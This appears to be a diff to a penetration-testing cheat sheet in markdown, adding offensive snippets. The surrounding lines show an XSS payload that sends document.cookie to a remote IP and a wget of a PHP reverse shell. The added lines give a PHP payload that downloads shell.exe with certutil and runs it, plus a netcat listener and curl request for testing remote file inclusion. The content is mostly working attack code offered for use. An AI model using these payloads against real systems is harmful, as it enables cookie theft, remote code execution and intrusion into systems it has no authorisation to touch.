@@ -171,6 +171,33 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 
 `wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`
 
+#### Grab and Execute File
+
+```
+<?php
+$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.203/shell.exe"', $val);
+sleep(5);
+$exec = system('shell.exe', $val);
+?>
+```
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Local File Inclusion
+
+#### Check for if reverse shell possible after =
+
+**Start Netcat Listener**
+
+`nc -nlvp 80`
+
+**Attempt to send request to Netcat listener**
+
+`curl http://targeturl/site/index.php?page=http://NetcatAddress/test`
+
 <!--
 ##################################################################
 ##################################################################
